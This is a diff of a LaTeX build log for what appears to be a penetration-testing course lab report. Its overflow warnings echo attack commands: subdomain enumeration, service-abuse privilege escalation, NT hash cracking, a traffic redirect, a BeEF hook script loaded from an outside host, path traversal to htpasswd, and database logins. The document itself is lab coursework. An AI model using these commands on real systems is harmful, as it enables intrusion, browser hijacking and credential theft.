@@ -1,9 +1,9 @@
-This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex 2023.9.6)  3 DEC 2023 13:38
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex 2023.9.6)  3 DEC 2023 22:35
 entering extended mode
  restricted \write18 enabled.
  %&-line parsing enabled.
-**ex140/report.tex
-(./ex140/report.tex
+**finalReport/report.tex
+(./finalReport/report.tex
 LaTeX2e <2021-11-15> patch level 1
 L3 programming layer <2022-01-21>
 (/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
@@ -238,8 +238,8 @@ Package: endnotes 2020-01-02 endnotes package
 \endnotesep=\dimen153
 \@enotes=\write5
 )
-LaTeX Font Info:    Trying to load font information for OT1+ppl on input line 5
-7.
+LaTeX Font Info:    Trying to load font information for OT1+ppl on input line 2
+5.
 
 (/usr/share/texlive/texmf-dist/tex/latex/psnfss/ot1ppl.fd
 File: ot1ppl.fd 2001/06/04 font definitions for OT1/ppl.
@@ -252,20 +252,20 @@ File: l3backend-pdftex.def 2022-01-12 L3 backend support: PDF output (pdfTeX)
 (./report.aux)
 \openout1 = `report.aux'.
 
-LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 57.
-LaTeX Font Info:    ... okay on input line 57.
-LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 57.
-LaTeX Font Info:    ... okay on input line 57.
-LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 57.
-LaTeX Font Info:    ... okay on input line 57.
-LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 57.
-LaTeX Font Info:    ... okay on input line 57.
-LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 57.
-LaTeX Font Info:    ... okay on input line 57.
-LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 57.
-LaTeX Font Info:    ... okay on input line 57.
-LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 57.
-LaTeX Font Info:    ... okay on input line 57.
+LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 25.
+LaTeX Font Info:    ... okay on input line 25.
+LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 25.
+LaTeX Font Info:    ... okay on input line 25.
+LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 25.
+LaTeX Font Info:    ... okay on input line 25.
+LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 25.
+LaTeX Font Info:    ... okay on input line 25.
+LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 25.
+LaTeX Font Info:    ... okay on input line 25.
+LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 25.
+LaTeX Font Info:    ... okay on input line 25.
+LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 25.
+LaTeX Font Info:    ... okay on input line 25.
 
 (/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
 [Loading MPS to PDF converter (version 2006.09.02).]
@@ -297,86 +297,107 @@ File: fc-english.def 2016/01/12
 
  [1
 
-{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map}]
-LaTeX Font Info:    Trying to load font information for OT1+pcr on input line 8
-8.
+{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map}] [2] [3]
+LaTeX Font Info:    Trying to load font information for OT1+pcr on input line 1
+35.
 
 (/usr/share/texlive/texmf-dist/tex/latex/psnfss/ot1pcr.fd
 File: ot1pcr.fd 2001/06/04 font definitions for OT1/pcr.
 )
-Overfull \hbox (75.0pt too wide) in paragraph at lines 95--95
+Overfull \hbox (9.0pt too wide) in paragraph at lines 155--155
+[]\OT1/pcr/m/n/10 fierce --domain artstailor.com --subdomain-file newList.txt[]
+ 
+ []
+
+
+Overfull \hbox (33.0pt too wide) in paragraph at lines 160--160
+[]\OT1/pcr/m/n/10 '10.70.184.40': 'KEY005-hKku4/qTxNsmJIG0iT8pSQ.artstailor.com
+.'[] 
+ []
+
+[4] [5] [6]
+<~/Desktop/school/fall2023/pen/ex/ex08/outlook.png, id=26, 1773.62625pt x 471.7
+625pt>
+File: ~/Desktop/school/fall2023/pen/ex/ex08/outlook.png Graphic file (type png)
+
+<use ~/Desktop/school/fall2023/pen/ex/ex08/outlook.png>
+Package pdftex.def Info: ~/Desktop/school/fall2023/pen/ex/ex08/outlook.png  use
+d on input line 255.
+(pdftex.def)             Requested size: 361.34999pt x 96.11446pt.
+
+Overfull \hbox (31.34999pt too wide) in paragraph at lines 255--256
+[][] 
+ []
+
+
+Overfull \hbox (45.0pt too wide) in paragraph at lines 288--288
+[]\OT1/pcr/m/n/10 Do-ServiceAbuse -Name "VSS" -User <Username> -Password <Passw
+ord>[] 
+ []
+
+[7 </home/esteban/Desktop/school/fall2023/pen/ex/ex08/outlook.png>]
+Overfull \hbox (51.0pt too wide) in paragraph at lines 322--322
+[]\OT1/pcr/m/n/10 john --wordlist=<pathToRockYou.txt> --format=NT passwordHashe
+s.txt[] 
+ []
+
+[8] [9]
+Overfull \hbox (75.0pt too wide) in paragraph at lines 423--423
+[]\OT1/pcr/m/n/10 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j
+ REDIRECT[] 
+ []
+
+[10] [11] [12]
+Overfull \hbox (9.0pt too wide) in paragraph at lines 510--510
+[]    \OT1/pcr/m/n/10 <script src='http://172.24.0.10:3000/hook.js'></script>[]
+ 
+ []
+
+[13]
+Overfull \hbox (15.0pt too wide) in paragraph at lines 543--543
+[]\OT1/pcr/m/n/10 www.artstailor.com/brian/getimage.php?raw=true&file=htpasswd[
+] 
+ []
+
+[14]
+Overfull \hbox (75.0pt too wide) in paragraph at lines 596--596
 []\OT1/pcr/m/n/10 cat sources/00/000000800.java | grep -e 'b64username' -e 'b64
 password'[] 
  []
 
 
-Overfull \hbox (3.0pt too wide) in paragraph at lines 105--105
+Overfull \hbox (3.0pt too wide) in paragraph at lines 606--606
 []\OT1/pcr/m/n/10 mysql -h db.artstailor.com --port=3306 -u db_user_token -p[] 
 
  []
 
-
-Overfull \hbox (9.0pt too wide) in paragraph at lines 110--110
+[15]
+Overfull \hbox (9.0pt too wide) in paragraph at lines 611--611
 []\OT1/pcr/m/n/10 mysql -h db.artstailor.com --port=3306 -u db_admin_token -p[]
  
  []
 
-[2]
-Overfull \hbox (75.0pt too wide) in paragraph at lines 138--138
-[]\OT1/pcr/m/n/10 cat sources/00/000000800.java | grep -e 'b64username' -e 'b64
-password'[] 
- []
-
-
-Overfull \hbox (3.0pt too wide) in paragraph at lines 158--158
-[]\OT1/pcr/m/n/10 mysql -h db.artstailor.com --port=3306 -u db_user_token -p[] 
-
- []
-
-[3]
-Overfull \hbox (9.0pt too wide) in paragraph at lines 168--168
-[]\OT1/pcr/m/n/10 mysql -h db.artstailor.com --port=3306 -u db_admin_token -p[]
- 
- []
-
-<~/Desktop/school/fall2023/pen/ex/ex140/pciDataCensored.png, id=17, 496.85625pt
- x 394.47375pt>
-File: ~/Desktop/school/fall2023/pen/ex/ex140/pciDataCensored.png Graphic file (
-type png)
-<use ~/Desktop/school/fall2023/pen/ex/ex140/pciDataCensored.png>
-Package pdftex.def Info: ~/Desktop/school/fall2023/pen/ex/ex140/pciDataCensored
-.png  used on input line 178.
-(pdftex.def)             Requested size: 289.07999pt x 229.51122pt.
-
-Underfull \hbox (badness 10000) in paragraph at lines 178--179
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 184--185
-
- []
-
-[4 </home/esteban/Desktop/school/fall2023/pen/ex/ex140/pciDataCensored.png>]
-(./report.aux) ) 
+[16] (./report.aux) ) 
 Here is how much of TeX's memory you used:
  4241 strings out of 478287
- 67580 string characters out of 5849290
- 381936 words of memory out of 5000000
+ 67499 string characters out of 5849290
+ 382938 words of memory out of 5000000
  22364 multiletter control sequences out of 15000+600000
  482506 words of font info for 61 fonts, out of 8000000 for 9000
  1141 hyphenation exceptions out of 8191
- 70i,6n,76p,1015b,213s stack positions out of 5000i,500n,10000p,200000b,80000s
-{/usr/share/texlive/texmf-dist/fonts/enc/dvips/base/8r.enc}</us
-r/share/texlive/texmf-dist/fonts/type1/urw/courier/ucrr8a.pfb></usr/share/texli
-ve/texmf-dist/fonts/type1/urw/palatino/uplb8a.pfb></usr/share/texlive/texmf-dis
-t/fonts/type1/urw/palatino/uplbi8a.pfb></usr/share/texlive/texmf-dist/fonts/typ
-e1/urw/palatino/uplr8a.pfb></usr/share/texlive/texmf-dist/fonts/type1/urw/palat
-ino/uplri8a.pfb>
-Output written on report.pdf (4 pages, 150435 bytes).
+ 70i,6n,76p,1021b,270s stack positions out of 5000i,500n,10000p,200000b,80000s
+{/usr/share/texlive/texmf-dist/fonts/enc/dvips/base/8r.enc
+}</usr/share/texlive/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi10.pfb></usr
+/share/texlive/texmf-dist/fonts/type1/public/amsfonts/cm/cmr10.pfb></usr/share/
+texlive/texmf-dist/fonts/type1/urw/courier/ucrr8a.pfb></usr/share/texlive/texmf
+-dist/fonts/type1/urw/palatino/uplb8a.pfb></usr/share/texlive/texmf-dist/fonts/
+type1/urw/palatino/uplbi8a.pfb></usr/share/texlive/texmf-dist/fonts/type1/urw/p
+alatino/uplr8a.pfb></usr/share/texlive/texmf-dist/fonts/type1/urw/palatino/uplr
+i8a.pfb>
+Output written on report.pdf (16 pages, 202288 bytes).
 PDF statistics:
- 46 PDF objects out of 1000 (max. 8388607)
- 27 compressed objects within 1 object stream
+ 95 PDF objects out of 1000 (max. 8388607)
+ 60 compressed objects within 1 object stream
  0 named destinations out of 1000 (max. 500000)
  6 words of extra memory for PDF output out of 10000 (max. 10000000)
 
